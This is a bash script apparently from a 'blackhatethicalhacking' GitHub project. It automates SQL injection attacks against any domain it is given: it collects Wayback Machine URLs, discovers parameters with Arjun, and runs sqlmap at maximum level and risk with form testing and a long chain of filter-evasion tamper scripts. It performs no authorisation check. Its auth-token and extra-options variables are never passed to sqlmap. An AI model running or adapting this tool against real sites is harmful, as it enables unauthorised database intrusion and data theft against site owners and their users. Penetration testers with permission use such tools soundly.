#!/bin/bash

# SQLMutant.sh - Automated SQL Injection Testing Tool
# Version: 2.0
# Author: Chris 'SaintDruG' Abou-Chabké
# GitHub: https://github.com/blackhatethicalhacking/SQLMutant
# Description: Automated tool for discovering and testing SQL injection vulnerabilities.

set -e  # Exit immediately if a command exits with a non-zero status
trap 'echo "An error occurred. Exiting..."; deactivate_virtualenv; exit 1;' ERR

#######################
# Function Definitions
#######################

# Display usage instructions
usage() {
    echo "Usage: $0 -d domain [-t threads] [-p proxy] [-a auth_token] [-h]"
    echo "  -d domain       Target domain to scan (e.g., example.com)"
    echo "  -t threads      Number of threads to use (default: 10)"
    echo "  -p proxy        Proxy server (e.g., http://proxyserver:port)"
    echo "  -a auth_token   Authentication token for protected sites"
    echo "  -h              Display this help message"
    exit 1
}

# Install missing packages
install_package() {
    package_name=$1
    echo "$package_name not found. Attempting to install..."
    if command -v apt-get > /dev/null; then
        sudo apt-get update && sudo apt-get install -y "$package_name"
    elif command -v yum > /dev/null; then
        sudo yum install -y "$package_name"
    elif command -v dnf > /dev/null; then
        sudo dnf install -y "$package_name"
    else
        echo "Package manager not found or unsupported. Please install $package_name manually."
        exit 1
    fi
}

# Check and install dependencies
check_dependencies() {
    dependencies=("lolcat" "figlet" "curl" "toilet" "virtualenv" "jq" "wget" "go" "pip3" "git" "python3")
    for dep in "${dependencies[@]}"; do
        if ! command -v "$dep" > /dev/null; then
            install_package "$dep"
        fi
    done
}

# Set up Python virtual environment
setup_virtualenv() {
    echo "Setting up Python virtual environment..."
    if ! command -v virtualenv > /dev/null; then
        echo "virtualenv not found, installing..."
        sudo pip3 install virtualenv
    fi
    virtualenv venv
    source venv/bin/activate
    pip install --upgrade pip
    pip install arjun uro httpx[cli]
}

# Deactivate Python virtual environment
deactivate_virtualenv() {
    if [[ "$VIRTUAL_ENV" != "" ]]; then
        deactivate
    fi
}

# Install Go tools
install_go_tools() {
    echo "Installing Go tools..."
    export GO111MODULE=on
    if [ ! -d "$HOME/go/bin" ]; then
        mkdir -p "$HOME/go/bin"
    fi
    export PATH="$PATH:$HOME/go/bin"
    go install github.com/tomnomnom/waybackurls@latest
    go install github.com/projectdiscovery/httpx/cmd/httpx@latest
}

# Display the ASCII art banner
display_banner() {
    curl --silent "https://raw.githubusercontent.com/blackhatethicalhacking/Subdomain_Bruteforce_bheh/main/ascii.sh" | lolcat
    echo ""
    figlet -w 80 -f small SQLMutant | lolcat
    echo ""
    echo "[YOU ARE USING SQLMutant.sh] - (v2.0) CODED BY Chris 'SaintDruG' Abou-Chabké WITH ❤ FOR blackhatethicalhacking.com for Educational Purposes only!" | lolcat
    echo ""
}

# Generate a random Sun Tzu quote
generate_quote() {
    quotes=("The supreme art of war is to subdue the enemy without fighting."
            "All warfare is based on deception."
            "He who knows when he can fight and when he cannot, will be victorious."
            "The whole secret lies in confusing the enemy, so that he cannot fathom our real intent."
            "To win one hundred victories in one hundred battles is not the acme of skill. To subdue the enemy without fighting is the acme of skill.")
    random_quote=${quotes[$RANDOM % ${#quotes[@]}]}
    echo "Offensive Security Tip: $random_quote - Sun Tzu" | lolcat
}

# Check for internet connectivity
check_internet() {
    echo "Checking for internet connectivity..." | lolcat
    wget -q --spider https://google.com
    if [ $? -ne 0 ]; then
        echo "No internet connection detected. Please connect to the internet before running SQLMutant.sh!" | lolcat
        exit 1
    fi
    echo "Internet connection detected. Proceeding..." | lolcat
}

# Validate domain input
validate_domain() {
    if [[ ! "$domain" =~ ^([a-zA-Z0-9-]+\.)+[a-zA-Z]{2,}$ ]]; then
        echo "Invalid domain format: $domain"
        exit 1
    fi
}

# Fetch and filter URLs
fetch_and_filter_urls() {
    echo "Creating directory for output files..." | lolcat
    mkdir -p "$domain"
    LOGFILE="$domain/sqlmutant.log"
    echo "Fetching URLs from Wayback Machine..." | lolcat
    waybackurls "$domain" | uro | tee "$domain/all_urls.txt"
    echo "Filtering URLs with parameters..." | lolcat
    grep -iE '\?' "$domain/all_urls.txt" > "$domain/urls_with_params.txt"
}

# Find additional parameters with Arjun
find_additional_params() {
    echo "Finding additional parameters using Arjun..." | lolcat
    arjun -i "$domain/all_urls.txt" -t "$threads" --disable-redirects -oJ "$domain/arjun_output.json"
    if [ -f "$domain/arjun_output.json" ]; then
        cat "$domain/arjun_output.json" | jq -r '.[] | select(.params != null) | .url' > "$domain/arjun_urls.txt"
    else
        touch "$domain/arjun_urls.txt"
    fi
}

# Merge URLs and prepare for SQLMap
prepare_sqlmap_input() {
    echo "Merging URLs for SQLMap testing..." | lolcat
    cat "$domain/urls_with_params.txt" "$domain/arjun_urls.txt" | uro | sort -u > "$domain/sqlmap_input.txt"
    num_sql_urls=$(wc -l "$domain/sqlmap_input.txt" | awk '{print $1}')
    echo "Found $num_sql_urls URLs ready for SQL injection testing." | lolcat
}

# Run SQLMap
run_sqlmap() {
    echo "Running SQLMap with aggressive settings..." | lolcat
    sqlmap -m "$domain/sqlmap_input.txt" \
        --batch \
        --random-agent \
        --level=5 \
        --risk=3 \
        --threads="$threads" \
        --tamper=apostrophemask,apostrophenullencode,base64encode,between,chardoubleencode,charencode,charunicodeencode,equaltolike,greatest,ifnull2ifisnull,multiplespaces,percentage,randomcase,space2comment,space2plus,space2randomblank,unionalltounion,unmagicquotes \
        --skip-urlencode \
        --forms \
        --smart \
        --output-dir="$domain/sqlmap_output" \
        $sqlmap_options
}

# Display final messages
display_final_messages() {
    echo "SQLMap scanning completed. Please review the results in $domain/sqlmap_output" | lolcat
    echo -e "\nThank you for using SQLMutant by SaintDruG!" | lolcat
}

# Cleanup function
cleanup() {
    deactivate_virtualenv
    echo "Cleanup completed."
}

#######################
# Main Execution Flow
#######################

# Parse command-line arguments
threads=10  # Default number of threads
while getopts ":d:t:p:a:h" opt; do
    case $opt in
        d) domain="$OPTARG" ;;
        t) threads="$OPTARG" ;;
        p) proxy="$OPTARG" ;;
        a) auth_token="$OPTARG" ;;
        h) usage ;;
        *) usage ;;
    esac
done

# Check if domain is provided
if [ -z "$domain" ]; then
    usage
fi

# Start of the script execution
display_banner
generate_quote
check_internet
validate_domain
check_dependencies
setup_virtualenv
install_go_tools

# Set proxy if provided
if [ -n "$proxy" ]; then
    export http_proxy="$proxy"
    export https_proxy="$proxy"
    echo "Proxy set to $proxy" | lolcat
fi

# Set authentication token if provided
if [ -n "$auth_token" ]; then
    auth_header="Authorization: Bearer $auth_token"
    echo "Authentication token set." | lolcat
fi

# Fetch and process URLs
fetch_and_filter_urls
find_additional_params
prepare_sqlmap_input

# Run SQLMap with error handling
run_sqlmap

# Display final messages
display_final_messages

# Cleanup and exit
cleanup

exit 0
